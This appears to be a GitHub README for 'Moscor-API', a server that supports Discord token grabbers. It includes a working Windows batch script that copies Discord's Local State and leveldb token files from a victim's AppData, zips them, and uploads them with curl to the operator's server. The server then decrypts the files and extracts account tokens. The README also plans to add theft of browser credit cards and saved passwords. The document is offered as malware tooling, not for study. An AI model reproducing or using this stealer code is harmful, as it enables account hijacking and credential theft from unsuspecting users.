# Moscor-API
an api for my project and grabbers, such as token info getting by simple sending info to api

# Token Info Api
- this gets info about discord token
- Modify ```http://127.0.0.1:5000/token_info``` to your url, based on where youre hosting the file on if its replit change it to replit and read the code, and modify last line
-  Usage:
```curl -H "Authorization: YOUR_DISCORD_TOKEN" http://127.0.0.1:5000/token_info```

# Decrypt token and token info api
- this will decrypt ldb, log and localstate files and look for tokens, usefull for custom grabbers that doenst directly support dpapi support.
- can be done in any language lol.
- how to send files to server and return? 

```bat
:: this will copy the files
@echo off
set "moscorlocalstate=%AppData%\discord\Local State"
set "moscorleveldb=%AppData%\discord\Local Storage\leveldb"
set "moscorlogs=%AppData%\moscorlogs"
set "moscorzip=%AppData%\moscorlogs.zip"

mkdir "%moscorlogs%" 2>nul

copy "%moscorlocalstate%" "%moscorlogs%" >NUL

copy "%moscorleveldb%\*.ldb" "%moscorlogs%" >NUL
copy "%moscorleveldb%\*.log" "%moscorlogs%" >NUL

pushd "%moscorlogs%"
powershell Compress-Archive -Path * -DestinationPath "%moscorzip%" >NUL
popd
::how to send?
curl -F "file=@%AppData%\moscorlogs.zip" http://127.0.0.1:5000/decrypt
```


## Todo: 
- Browser Decryption . CC / Logins / Passwords  (chrome,edge,firefox)
- - It will send files to the server it will decrypt and return them. :]
